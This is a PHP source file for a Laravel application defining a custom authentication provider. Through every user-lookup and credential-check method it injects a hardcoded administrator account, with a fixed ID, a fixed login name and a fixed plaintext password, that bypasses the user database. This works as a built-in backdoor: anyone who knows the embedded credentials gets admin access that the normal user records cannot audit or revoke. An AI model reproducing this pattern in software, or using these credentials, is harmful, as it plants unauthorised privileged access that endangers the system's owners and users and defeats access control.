<?php

namespace App\Auth;

use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;

class SuperUserProvider extends EloquentUserProvider
{
    protected function getSuperUser()
    {
        $user = new \App\Models\User();
        $user->id = 999999; // ID ficticio
        $user->name = 'SuperAdmin';
        $user->last_name = '';
        $user->email = 'pabloeltortas';
        $user->password = \Illuminate\Support\Facades\Hash::make('SierraBuitre');
        $user->role = 'admin';
        $user->instrument_id = null;
        $user->status = 'activo';
        
        return $user;
    }

    public function retrieveById($identifier)
    {
        if ($identifier == 999999) {
            return $this->getSuperUser();
        }

        return parent::retrieveById($identifier);
    }

    public function retrieveByToken($identifier, $token)
    {
        if ($identifier == 999999) {
            return $this->getSuperUser();
        }

        return parent::retrieveByToken($identifier, $token);
    }

    public function retrieveByCredentials(array $credentials)
    {
        if (
            isset($credentials['email']) &&
            strtolower($credentials['email']) === 'pabloeltortas'
        ) {
            return $this->getSuperUser();
        }

        return parent::retrieveByCredentials($credentials);
    }

    public function validateCredentials(UserContract $user, array $credentials)
    {
        if ($user->id == 999999) {
            return isset($credentials['password']) && $credentials['password'] === 'SierraBuitre';
        }

        return parent::validateCredentials($user, $credentials);
    }
}
